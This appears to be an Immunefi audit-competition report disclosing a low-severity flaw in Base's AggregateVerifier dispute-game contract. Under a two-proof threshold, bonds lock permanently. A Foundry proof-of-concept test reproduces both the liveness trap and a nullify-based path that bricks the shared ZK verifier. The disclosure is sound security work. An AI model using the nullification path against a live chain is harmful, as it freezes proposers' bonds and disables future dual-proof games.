# 75296 sc low permanent freezing of dispute game bonds in aggregateverifier on dual proof chains proof threshold 2 due to unreachable claimcredit fallback

**Submitted on Apr 28th 2026 at 11:25:00 UTC by @Oxodus for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75296
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Permanent freezing of funds in the bridge or in dispute game bonds with no available recovery path
  * Manipulating dispute game bond mechanics to economically grief proposers or prevent legitimate proposals from being submitted

## Description

## Brief/Intro

On any chain configured with `PROOF_THRESHOLD >= 2` (the documented dual-proof end-state), an `AggregateVerifier` dispute game that reaches the state `proofCount == 1 && block.timestamp > expectedResolution` becomes permanently stuck. `resolve()` reverts forever, `claimCredit()`'s 14-day rescue path is unreachable, and `verifyProposalProof()` cannot accept a late proof. The proposer's `INIT_BOND` is permanently locked in `DelayedWETH` with no available recovery path. The trigger requires no invalid proof; a single 7-day ZK-prover unavailability is sufficient.

## Vulnerability Details

The bug is the interaction of three pieces of `contracts/src/multiproof/AggregateVerifier.sol`. First, `resolve()` hard-gates on the proof threshold at line 458, reverting `NotEnoughProofs` whenever fewer proofs have been accepted than `PROOF_THRESHOLD`:

```solidity
if (proofCount < PROOF_THRESHOLD) revert NotEnoughProofs();
```

Second, `_getDelay()` at line 815 maps `proofCount == 1` to `SLOW_FINALIZATION_DELAY` (7 days) rather than `type(uint64).max`; only `proofCount == 0` returns the sentinel:

```solidity
function _getDelay() internal view returns (uint64) {
    if (proofCount >= 2) return FAST_FINALIZATION_DELAY;        // 1 day
    else if (proofCount == 1) return SLOW_FINALIZATION_DELAY;   // 7 days
    else return type(uint64).max;                                // 14-day fallback
}
```

Third, `claimCredit()` at lines 613-617 conditions its 14-day rescue branch on `expectedResolution == type(uint64).max`, otherwise routing to a branch that requires `resolvedAt != 0`:

```solidity
if (expectedResolution.raw() != type(uint64).max) {
    if (resolvedAt.raw() == 0) revert GameNotResolved();   // permanent revert
} else {
    if (block.timestamp < createdAt.raw() + 14 days) revert GameNotOver();
}
```

When `proofCount == 1` and `PROOF_THRESHOLD == 2`, `expectedResolution` is set to `now + 7 days` (not `uint64.max`), so the 14-day fallback is never taken and `claimCredit` reverts forever. `verifyProposalProof()` additionally reverts `GameOver` after `expectedResolution` (line 423), so a late second proof cannot rescue the game. The author's intent contradicts the implementation: the comment in `challenge()` at lines 526-530 reads *"If the ZK is nullified, we allow the remaining TEE proof to resolve"*, but the threshold gate prevents exactly that.

The trapped state is reachable via two independent paths. The first is liveness-only with no attacker and no invalid proof: the proposer initializes a game with a valid TEE proof (`proofCount = 1`, `expectedResolution = now + 7 days`); the ZK prover fails to submit within the SLOW window for any benign reason (outage, slow proving, witness-fetcher bug, single-blob censorship); after 7 days the game is permanently stuck. The second is a post-nullification scenario: TEE init, then a ZK challenge brings `proofCount` to 2, then anyone calls `nullify(zkProof, idx, originalRoot)` with a ZK proof supporting the original root — `_proofRefutedUpdate(ZK)` drops `proofCount` back to 1 and additionally flips `Verifier.nullified` on the shared `ZK_VERIFIER` contract. Because `nullified` is a contract-level flag rather than per-game, the same nullification permanently bricks every future dual proof game on the chain that uses that verifier.

## Impact Details

* Per-game loss: the full `INIT_BOND` (production value set by `DisputeGameFactory.setInitBond`) is permanently trapped in `DelayedWETH`. `closeGame()` requires `resolvedAt != 0`, and `DelayedWETH.unlock` is only callable from `claimCredit()`. No governance recovery path exists currently exists.
* Liveness collapse: every game whose ZK prover is unavailable for 7+ days reaches the trap state. No adversary required.
* Systemic brick after a single nullification since `Verifier.nullified` is contract level, one successful nullification on any clone permanently bricks every future dual proof game on the chain until the verifier is replaced.
* Recovery would require a `AggregateVerifier` implementation upgrade and migration of `DisputeGameFactory.gameImpls[621]`. In-flight bonds in the old implementation are not recovered by the upgrade.

## References

* `contracts/src/multiproof/AggregateVerifier.sol`
  * `resolve()` threshold gate — line 458
  * `claimCredit()` fallback gate — lines 606-634
  * `_getDelay()` — lines 815-822
  * `_increaseExpectedResolution()` — lines 800-813
  * `verifyProposalProof()` `GameOver` revert — line 423
  * Author-intent comment in `challenge()` — lines 526-535
* `contracts/src/multiproof/Verifier.sol` — `nullified` is contract-level, not per-game

## Proof of Concept

Create a file named `BondLockOnDualProof.t.sol` and paste the following test

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import { Claim, GameStatus, GameType } from "src/dispute/lib/Types.sol";
import { GameNotResolved } from "src/dispute/lib/Errors.sol";

import { AggregateVerifier } from "src/multiproof/AggregateVerifier.sol";
import { IVerifier } from "interfaces/multiproof/IVerifier.sol";
import { IAnchorStateRegistry } from "interfaces/dispute/IAnchorStateRegistry.sol";
import { IDelayedWETH } from "interfaces/dispute/IDelayedWETH.sol";
import { IDisputeGame } from "interfaces/dispute/IDisputeGame.sol";

import { BaseTest } from "./BaseTest.t.sol";

/// @notice PoC: permanent bond lock in `AggregateVerifier` when `PROOF_THRESHOLD >= 2`.
///         The state `proofCount == 1 AND expectedResolution != uint64.max` is reachable
///         and traps the bond forever: `resolve()` reverts `NotEnoughProofs`,
///         `claimCredit()`'s 14-day fallback is unreachable, and `verifyProposalProof()`
///         reverts `GameOver` after the deadline.
contract BondLockOnDualProof is BaseTest {
    AggregateVerifier internal dualProofImpl;
    GameType internal constant DUAL_PROOF_GAME_TYPE = GameType.wrap(622);

    function setUp() public override {
        super.setUp();
        _deployDualProofImpl();
    }

    function _deployDualProofImpl() internal {
        dualProofImpl = new AggregateVerifier(
            DUAL_PROOF_GAME_TYPE,
            IAnchorStateRegistry(address(anchorStateRegistry)),
            IDelayedWETH(payable(address(delayedWETH))),
            IVerifier(address(teeVerifier)),
            IVerifier(address(zkVerifier)),
            TEE_IMAGE_HASH,
            AggregateVerifier.ZkHashes(ZK_RANGE_HASH, ZK_AGGREGATE_HASH),
            CONFIG_HASH,
            L2_CHAIN_ID,
            BLOCK_INTERVAL,
            INTERMEDIATE_BLOCK_INTERVAL,
            2 // PROOF_THRESHOLD
        );
        factory.setImplementation(DUAL_PROOF_GAME_TYPE, IDisputeGame(address(dualProofImpl)));
        factory.setInitBond(DUAL_PROOF_GAME_TYPE, INIT_BOND);
        anchorStateRegistry.setRespectedGameType(DUAL_PROOF_GAME_TYPE);
    }

    function _createDualProofGame(
        address creator,
        Claim rootClaim,
        uint256 l2BlockNumber,
        bytes memory proof
    )
        internal
        returns (AggregateVerifier game)
    {
        bytes memory intermediateRoots =
            abi.encodePacked(_generateIntermediateRootsExceptLast(l2BlockNumber), rootClaim.raw());
        bytes memory extraData =
            abi.encodePacked(uint256(l2BlockNumber), address(anchorStateRegistry), intermediateRoots);

        vm.deal(creator, INIT_BOND);
        vm.prank(creator);
        return AggregateVerifier(
            address(
                factory.createWithInitData{ value: INIT_BOND }(
                    DUAL_PROOF_GAME_TYPE, rootClaim, extraData, proof
                )
            )
        );
    }

    /// @notice Liveness-only: ZK prover never submits within the SLOW window.
    function test_LivenessOnly_BondLocked() public {
        currentL2BlockNumber += BLOCK_INTERVAL;

        Claim rootA = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "tee-only")));
        bytes memory teeProof = _generateProof("tee-only", AggregateVerifier.ProofType.TEE);

        AggregateVerifier game = _createDualProofGame(TEE_PROVER, rootA, currentL2BlockNumber, teeProof);

        assertEq(game.proofCount(), 1);
        assertTrue(game.expectedResolution().raw() != type(uint64).max);

        vm.warp(block.timestamp + 7 days + 1);
        assertTrue(game.gameOver());

        bytes memory zkProofLate = _generateProof("zk-late", AggregateVerifier.ProofType.ZK);
        vm.expectRevert(AggregateVerifier.GameOver.selector);
        vm.prank(ZK_PROVER);
        game.verifyProposalProof(zkProofLate);

        vm.expectRevert(AggregateVerifier.NotEnoughProofs.selector);
        game.resolve();

        vm.warp(block.timestamp + 14 days);

        vm.expectRevert(GameNotResolved.selector);
        game.claimCredit();

        vm.expectRevert(AggregateVerifier.NotEnoughProofs.selector);
        game.resolve();

        // Even after a year, both still revert.
        vm.warp(block.timestamp + 365 days);
        vm.expectRevert(GameNotResolved.selector);
        game.claimCredit();
        vm.expectRevert(AggregateVerifier.NotEnoughProofs.selector);
        game.resolve();

        assertEq(delayedWETH.balanceOf(address(game)), INIT_BOND);
    }

    /// @notice Post-nullify: challenge + ZK nullify drops proofCount to 1
    ///         and globally bricks the ZK verifier.
    function test_NullifyTraps() public {
        currentL2BlockNumber += BLOCK_INTERVAL;

        Claim rootA = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "A")));
        bytes memory teeProof = _generateProof("tee-A", AggregateVerifier.ProofType.TEE);
        AggregateVerifier game = _createDualProofGame(TEE_PROVER, rootA, currentL2BlockNumber, teeProof);

        Claim contraRoot = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "contra")));
        bytes memory zkChallenge = _generateProof("zk-challenge", AggregateVerifier.ProofType.ZK);
        vm.prank(ATTACKER);
        game.challenge(zkChallenge, BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL - 1, contraRoot.raw());
        assertEq(game.proofCount(), 2);

        bytes memory zkNullify = _generateProof("zk-nullify", AggregateVerifier.ProofType.ZK);
        game.nullify(zkNullify, BLOCK_INTERVAL / INTERMEDIATE_BLOCK_INTERVAL - 1, rootA.raw());

        assertEq(game.proofCount(), 1);
        assertEq(zkVerifier.nullified(), true);
        assertTrue(game.expectedResolution().raw() != type(uint64).max);

        vm.warp(block.timestamp + 7 days + 1);

        vm.expectRevert(AggregateVerifier.NotEnoughProofs.selector);
        game.resolve();

        bytes memory zkLate = _generateProof("zk-late", AggregateVerifier.ProofType.ZK);
        vm.expectRevert(AggregateVerifier.GameOver.selector);
        vm.prank(ZK_PROVER);
        game.verifyProposalProof(zkLate);

        vm.warp(block.timestamp + 14 days);
        vm.expectRevert(GameNotResolved.selector);
        game.claimCredit();
    }

    /// @notice Sanity baseline: same flow with PROOF_THRESHOLD == 1 resolves cleanly.
    function test_SingleProofDoesNotTrap() public {
        currentL2BlockNumber += BLOCK_INTERVAL;
        Claim root = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber, "single")));
        bytes memory teeProof = _generateProof("tee-single", AggregateVerifier.ProofType.TEE);

        AggregateVerifier game = _createAggregateVerifierGame(
            TEE_PROVER, root, currentL2BlockNumber, address(anchorStateRegistry), teeProof
        );

        vm.warp(block.timestamp + 7 days);
        game.resolve();
        assertEq(uint8(game.status()), uint8(GameStatus.DEFENDER_WINS));

        uint256 balanceBefore = TEE_PROVER.balance;
        game.claimCredit();
        vm.warp(block.timestamp + DELAYED_WETH_DELAY);
        game.claimCredit();
        assertEq(TEE_PROVER.balance, balanceBefore + INIT_BOND);
    }
}
```

Run the command

```bash
forge test --match-path "test/multiproof/BondLockOnDualProof.t.sol" -vvv
```

The test successfully runs with the following output

```
Solc 0.8.15 finished in 1.67s
Compiler run successful!

Ran 3 tests for test/multiproof/BondLockOnDualProof.t.sol:BondLockOnDualProof
[PASS] test_LivenessOnly_BondLocked() (gas: 573123)
[PASS] test_NullifyTraps() (gas: 638773)
[PASS] test_SingleProofDoesNotTrap() (gas: 594264)
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.66ms (655.63µs CPU time)
```
